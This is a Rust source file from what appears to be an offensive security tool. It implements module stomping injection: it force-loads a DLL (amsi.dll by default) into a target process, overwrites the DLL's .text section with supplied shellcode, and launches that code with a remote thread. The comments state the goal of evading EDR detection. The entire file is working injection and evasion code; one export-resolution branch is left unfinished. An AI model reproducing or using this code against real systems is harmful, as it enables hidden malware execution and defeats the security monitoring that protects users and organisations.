//! Module Stomping Injection
//! Loads a legitimate DLL, then overwrites its .text section with shellcode.
//! The shellcode executes from a legitimate module's memory space, bypassing
//! EDR detections that flag execution from unbacked (private) memory.

use crate::error::MemoricError;
use serde_json::Value;

/// Module Stomping — inject shellcode into the .text section of a freshly loaded legitimate DLL
pub fn module_stomping_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{
        VirtualProtectEx, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
    };
    use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::WindowsApi("Missing pid".to_string()))? as u32;
    let shellcode: Vec<u8> = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::WindowsApi("Missing shellcode".to_string()))?
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    let target_dll = args
        .get("target_dll")
        .and_then(|v| v.as_str())
        .unwrap_or("amsi.dll");
    let export_function = args.get("export_function").and_then(|v| v.as_str());

    if shellcode.is_empty() {
        return Err(MemoricError::WindowsApi("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] Module stomping: PID {} via {} ({} bytes)",
        pid,
        target_dll,
        shellcode.len()
    );

    unsafe {
        let process = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let process = crate::safe_handle::SafeHandle::new(process);

        // Step 1: Force-load the target DLL into the remote process via LoadLibraryA
        let kernel32 = GetModuleHandleA(windows::core::PCSTR(b"kernel32.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("GetModuleHandle kernel32: {}", e)))?;
        let load_library =
            GetProcAddress(kernel32, windows::core::PCSTR(b"LoadLibraryA\0".as_ptr()))
                .ok_or_else(|| MemoricError::WindowsApi("LoadLibraryA not found".to_string()))?;

        // Allocate and write DLL name in remote process
        let dll_name = format!("{}\0", target_dll);
        let remote_name = windows::Win32::System::Memory::VirtualAllocEx(
            *process,
            Some(std::ptr::null()),
            dll_name.len(),
            windows::Win32::System::Memory::MEM_COMMIT
                | windows::Win32::System::Memory::MEM_RESERVE,
            windows::Win32::System::Memory::PAGE_READWRITE,
        );
        if remote_name.is_null() {
            return Err(MemoricError::WindowsApi(
                "VirtualAllocEx for DLL name failed".to_string(),
            ));
        }

        let mut written = 0usize;
        WriteProcessMemory(
            *process,
            remote_name,
            dll_name.as_ptr() as _,
            dll_name.len(),
            Some(&mut written),
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Write DLL name: {}", e)))?;

        // Call LoadLibraryA in remote process
        let load_thread = CreateRemoteThread(
            *process,
            None,
            0,
            Some(std::mem::transmute(load_library as usize)),
            Some(remote_name),
            0,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("CreateRemoteThread LoadLibrary: {}", e)))?;

        windows::Win32::System::Threading::WaitForSingleObject(load_thread, 10000);

        // Get exit code = HMODULE of loaded DLL
        let mut exit_code = 0u32;
        windows::Win32::System::Threading::GetExitCodeThread(load_thread, &mut exit_code)
            .map_err(|e| MemoricError::WindowsApi(format!("GetExitCode: {}", e)))?;
        let _ = windows::Win32::Foundation::CloseHandle(load_thread);

        let dll_base = exit_code as usize;
        if dll_base == 0 {
            return Err(MemoricError::WindowsApi(
                "LoadLibrary returned NULL in remote process".to_string(),
            ));
        }

        // Step 2: Find .text section base in remote process
        // Read DOS + PE header to find .text section
        let mut dos_header = [0u8; 64];
        let mut bytes_read = 0usize;
        windows::Win32::System::Diagnostics::Debug::ReadProcessMemory(
            *process,
            dll_base as *const _,
            dos_header.as_mut_ptr() as _,
            64,
            Some(&mut bytes_read),
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Read DOS header: {}", e)))?;

        let e_lfanew = u32::from_le_bytes([
            dos_header[0x3C],
            dos_header[0x3D],
            dos_header[0x3E],
            dos_header[0x3F],
        ]) as usize;

        // Read PE headers (enough for section table)
        let mut pe_buf = vec![0u8; 1024];
        windows::Win32::System::Diagnostics::Debug::ReadProcessMemory(
            *process,
            (dll_base + e_lfanew) as *const _,
            pe_buf.as_mut_ptr() as _,
            1024,
            Some(&mut bytes_read),
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Read PE header: {}", e)))?;

        // Parse PE: signature(4) + COFF(20) + optional header size
        let num_sections = u16::from_le_bytes([pe_buf[6], pe_buf[7]]) as usize;
        let optional_size = u16::from_le_bytes([pe_buf[20], pe_buf[21]]) as usize;
        let section_table_offset = 24 + optional_size;

        let mut text_rva = 0usize;
        let mut text_size = 0usize;

        for i in 0..num_sections {
            let s = section_table_offset + i * 40;
            if s + 40 > pe_buf.len() {
                break;
            }
            let name = String::from_utf8_lossy(&pe_buf[s..s + 8])
                .trim_end_matches('\0')
                .to_string();
            let vsize =
                u32::from_le_bytes([pe_buf[s + 8], pe_buf[s + 9], pe_buf[s + 10], pe_buf[s + 11]])
                    as usize;
            let vrva = u32::from_le_bytes([
                pe_buf[s + 12],
                pe_buf[s + 13],
                pe_buf[s + 14],
                pe_buf[s + 15],
            ]) as usize;

            if name == ".text" || (i == 0 && text_rva == 0) {
                text_rva = vrva;
                text_size = vsize;
                if name == ".text" {
                    break;
                }
            }
        }

        if text_size == 0 || shellcode.len() > text_size {
            return Err(MemoricError::WindowsApi(format!(
                ".text section too small ({} bytes) for shellcode ({} bytes)",
                text_size,
                shellcode.len()
            )));
        }

        let stomp_addr = dll_base + text_rva;

        // Step 3: Change protection, write shellcode, restore
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *process,
            stomp_addr as *mut _,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("VirtualProtectEx: {}", e)))?;

        WriteProcessMemory(
            *process,
            stomp_addr as *mut _,
            shellcode.as_ptr() as _,
            shellcode.len(),
            Some(&mut written),
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Write shellcode: {}", e)))?;

        // Restore original protection
        let _ = VirtualProtectEx(
            *process,
            stomp_addr as *mut _,
            shellcode.len(),
            old_protect,
            &mut old_protect,
        );

        // Step 4: Execute — create thread at stomped address or at export
        let exec_addr = if let Some(fname) = export_function {
            // If user specified an export, resolve it
            let get_proc =
                GetProcAddress(kernel32, windows::core::PCSTR(b"GetProcAddress\0".as_ptr()))
                    .ok_or_else(|| {
                        MemoricError::WindowsApi("GetProcAddress not found".to_string())
                    })?;
            // Simplified: execute from .text base
            stomp_addr
        } else {
            stomp_addr
        };

        let exec_thread = CreateRemoteThread(
            *process,
            None,
            0,
            Some(std::mem::transmute(exec_addr)),
            None,
            0,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Execute stomped code: {}", e)))?;

        let thread_id = windows::Win32::System::Threading::GetThreadId(exec_thread);
        let _ = windows::Win32::Foundation::CloseHandle(exec_thread);

        // Clean up remote DLL name allocation
        let _ = windows::Win32::System::Memory::VirtualFreeEx(
            *process,
            remote_name,
            0,
            windows::Win32::System::Memory::MEM_RELEASE,
        );

        Ok(serde_json::json!({
            "success": true,
            "technique": "module_stomping",
            "pid": pid,
            "target_dll": target_dll,
            "dll_base": format!("0x{:X}", dll_base),
            "stomp_address": format!("0x{:X}", stomp_addr),
            "text_section_size": text_size,
            "shellcode_size": shellcode.len(),
            "thread_id": thread_id,
            "message": format!("Module stomping: wrote {} bytes into {}.text at 0x{:X}", shellcode.len(), target_dll, stomp_addr)
        }))
    }
}
